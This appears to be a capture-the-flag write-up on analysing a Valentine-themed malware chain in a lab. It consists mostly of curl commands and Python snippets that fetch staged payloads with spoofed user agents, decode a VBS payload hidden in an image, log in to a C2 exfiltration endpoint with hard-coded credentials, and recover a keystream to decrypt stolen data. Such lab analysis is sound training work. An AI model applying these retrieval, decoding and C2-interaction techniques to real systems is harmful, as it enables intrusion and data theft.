## Initial Access and Payload Delivery
``` BASH
curl -L -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36" http://delivery.cupidsarrow.thm/card.html
```

<img width="1193" height="829" alt="image" src="https://github.com/user-attachments/assets/d65a22cc-6396-4866-b6a7-d03c0810faa2" />

``` BASH
curl -O -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36" http://delivery.cupidsarrow.thm/valentine-animations.js
```

## Persistence and Downloader Execution
``` BASH
curl -o love.hta -H "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Trident/7.0)" -H "Referer: http://delivery.cupidsarrow.thm/" http://ecard.rosesforyou.thm/love.hta
```

<img width="1184" height="621" alt="image-3" src="https://github.com/user-attachments/assets/65a709bf-739f-42e5-a1e6-4c73fe3b7c36" />

``` BASH
curl -sS -o bthprops.cpl -H "User-Agent: certutil" -H "Accept: */*" http://gifts.bemyvalentine.thm/bthprops.cpl
```

```PYTHON
def solve():
    url_part = [
        0x24, 0x11, 0x6a, 0x47, 0xd2, 0xae, 0x95, 0x3f, 
        0x6b, 0x5c, 0xb2, 0xea, 0xd2, 0x77, 0x01, 0x5c, 
        0xb9, 0x90, 0xda, 0x2f, 0x1d, 0x70, 0xb8, 0x97, 
        0xe7, 0x63, 0x12, 0x77, 0x5d, 0xc6, 0xe1, 0xce
    ]
    
    flag_part = [
        0x1c, 0x6c, 0x5a, 0xf9, 0xf8, 0xd2, 0x6b, 0x00, 
        0x64, 0x00, 0x65, 0x00, 0x65, 0x4b, 0x00, 0x64, 
        0x42, 0x00, 0x6b, 0x4c, 0x00, 0x6c
    ]
    
    full_data = url_part + flag_part
    
    decoded = ""
    for i, b in enumerate(full_data):
        key = (i * 41) & 0xFF
        char = (b ^ key ^ 0x4c) & 0xFF
        decoded += chr(char)
        
    print(f"PeBny cig: {decoded}")

solve()
```

``` BASH
curl -v -o cupid.ps1 -H "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Trident/7.0)" -H "Referer: http://loader.sweethearts.thm/" http://loader.sweethearts.thm/cupid.ps1
```

```PYTHON
python3 - <<'PY'
import requests,base64
url="http://cdn.loveletters.thm/roses.jpg"
m=b"<!--VALENTINE_PAYLOAD_START-->"
k=b"ROSES"
d=requests.get(url).content
i=d.find(m)
assert i!=-1, "marker not found"
blob=d[i+len(m):]
blob=blob[:-2]
x=bytes(b^k[j%len(k)] for j,b in enumerate(blob))
b64=x.decode('ascii','ignore')
vbs=base64.b64decode(b64)
open("valentine.vbs","wb").write(vbs)
print("wrote valentine.vbs, first 200 bytes:\\n",vbs[:200])
PY
```

## Ransomware Deployment
``` BASH
curl -L http://cdn.loveletters.thm/heartbeat.exe -o heartbeat.exe
```

``` BASH
strings heartbeat.exe | grep -iE "cupid|valentines" -A 50
```

``` BASH
curl -X POST -u cupid_agent:'R0s3s4r3R3d!V10l3ts4r3Blu3#2024' -H "Content-Type: application/octet-stream" http://api.valentinesforever.thm/exfil -v
```

``` BASH
Trying 10.113.133.118:80...
TCP_NODELAY set
Connected to api.valentinesforever.thm (10.113.133.118) port 80 (#0)
Server auth using Basic with user 'cupid_agent'
POST /exfil HTTP/1.1
Host: api.valentinesforever.thm
Authorization: Basic Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==
User-Agent: curl/7.68.0
Accept: */*
Content-Type: application/octet-stream
Mark bundle as not supporting multiuse
HTTP/1.1 404 Not Found
Date: Tue, 24 Feb 2026 10:19:29 GMT
Server: Apache/2.4.52 (Ubuntu)
Last-Modified: Sun, 15 Feb 2026 17:34:15 GMT
ETag: "521-64ae03f4e9550"
Accept-Ranges: bytes
Content-Length: 1313
Content-Type: text/html
```

<img width="996" height="218" alt="image-4" src="https://github.com/user-attachments/assets/f0f47d05-54e9-4220-b54b-4011895a16c7" />

## C2 Infrastructure Discovery

<img width="1081" height="276" alt="image-5" src="https://github.com/user-attachments/assets/cd14949d-9153-4d8f-92d3-c5d0a2b2d343" />

<img width="967" height="309" alt="image-6" src="https://github.com/user-attachments/assets/4b20ded1-5944-473a-9da3-c431703713f5" />

## Data Exfiltration Analysis

<img width="1184" height="587" alt="image-7" src="https://github.com/user-attachments/assets/c704507d-6261-44a8-812c-cac1f2cc928f" />

``` BASH
curl -u cupid_agent:'R0s3s4r3R3d!V10l3ts4r3Blu3#2024' http://api.valentinesforever.thm:8080/exfil/61d07abe73c3.enc -o 61d07abe73c3.enc
```

## Final Decryption and Flag Recovery
``` BASH
curl -i -X POST -H 'Authorization: Basic Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==' -H 'Content-Type: application/octet-stream' --data-binary @nulos.bin http://api.valentinesforever.thm:8080/exfil
```

<img width="1067" height="282" alt="image-8" src="https://github.com/user-attachments/assets/0f90c259-3963-44d6-8385-34bf113e7819" />

``` BASH
curl -s -H 'Authorization: Basic Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==' http://api.valentinesforever.thm:8080/exfil/70571de5bca6.enc -o keystream.bin && python3 -c "k=open('keystream.bin','rb').read(); f=open('61d07abe73c3.enc','rb').read(); print(''.join(chr(a^b) for a,b in zip(f,k)))"
```

<img width="1085" height="592" alt="image-9" src="https://github.com/user-attachments/assets/68e92ece-4902-4875-b6ae-ac9f4d85390e" />
